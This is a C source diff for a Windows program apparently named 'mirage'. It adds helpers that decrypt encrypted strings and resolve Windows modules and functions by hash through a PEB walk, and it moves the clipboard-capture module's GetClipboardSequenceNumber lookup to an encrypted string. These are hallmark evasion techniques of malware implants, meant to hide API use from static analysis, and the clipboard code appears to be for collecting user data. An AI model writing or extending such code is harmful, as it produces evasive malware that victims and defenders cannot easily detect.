@@ -6,6 +6,17 @@
 #include "enc_strings.h"
 #include <windows.h>
 
+/* ── Inline helpers for encrypted PEB-walk resolution ──────── */
+static inline void *resolve_mod_enc(const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_module_by_hash(mirage_encrypted_hash_module(buf));
+}
+static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
+}
+
+
 #ifdef ENABLE_CLIPBOARD
 
 #define CF_UNICODETEXT 13
@@ -72,8 +83,7 @@ static int cl_ensure_api(void) {
     cl_api.pAlloc = (pGlobalAlloc)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
 
     /* GetClipboardSequenceNumber — not yet in enc_strings.h; use hash directly */
-    cl_api.pGetSeq = (pGetClipboardSequenceNumber)mirage_get_function_by_hash(
-        u32, mirage_encrypted_hash_func("GetClipboardSequenceNumber"));
+    cl_api.pGetSeq = (pGetClipboardSequenceNumber)resolve_fn_enc(u32, enc_GetClipboardSequenceNumber, ENC_GETCLIPBOARDSEQUENCENUMBER_LEN);
 
     if (!cl_api.pOpen || !cl_api.pClose || !cl_api.pGetData ||
         !cl_api.pLock || !cl_api.pUnlock)
